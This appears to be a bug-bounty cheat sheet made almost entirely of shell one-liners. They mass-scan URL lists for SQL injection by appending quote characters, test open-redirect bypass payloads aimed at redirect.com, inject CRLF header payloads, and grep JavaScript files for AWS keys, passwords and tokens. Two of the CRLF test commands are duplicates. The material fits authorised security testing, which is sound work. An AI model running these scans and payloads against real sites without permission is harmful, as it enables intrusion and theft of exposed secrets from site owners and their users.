# SQL Injection:

cat sql | grep ".php" | sed 's/.php.*/.php/' | sort -u | sed 's|$|%27%22%60|' | while read url ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mVulnerable\e[0m" || echo -e "$url \e[1;31mNot Vulnerable\e[0m" ; done

 
 cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | httpx -silent -ms "You have an error in your SQL syntax"

## Sensitive information disclosure throgh JS files:

cat *js | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret" /path/to/directory/*.js


## Extract urls from JS files:

grep -r -oP --no-filename "(?<=('|\`|\"))(http[s]?:\/\/[a-zA-Z0-9_?&=\/\-#.]*?)(?=('|\`|\"))" *.js | sort -u


## Download js files from whole js.txt files:

#!/bin/bash

while IFS= read -r url; do
    echo "Downloading: $url"
    wget "$url" -P  /home/vijay/Desktop/Bug_Bounty/nasa/JS
done < alivejs.txt

## On Live Domains List (File containing Live Domains)


cat sub.txt | rush -j40 'if curl -Iks -m 10 "{}/https://redirect.com" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/redirect.com" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}////;@redirect.com" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/////redirect.com" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "{} It seems an Open Redirect Found"; fi'

## On Parameters (File containing urls with parameters)


cat redirect.txt | qsreplace "https://redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'

# Test Case 2

cat redirect.txt | qsreplace "redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'

# Test Case 3

cat redirect.txt | qsreplace "////;@redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'

# Test Case 4

cat redirect.txt | qsreplace "/////redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | grep -E "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'

## Extract urls from Js files:

cat js.txt | while read line; do curl $line -s -k; done | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u


## CRLF On Live Urls with Parameters:

cat urls.txt | qsreplace "%0d%0acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'

# Test1:

cat urls.txt | qsreplace "%E5%98%8D%E5%98%8Acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'

# Test2:

cat urls.txt | qsreplace "%E5%98%8D%E5%98%8Acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'




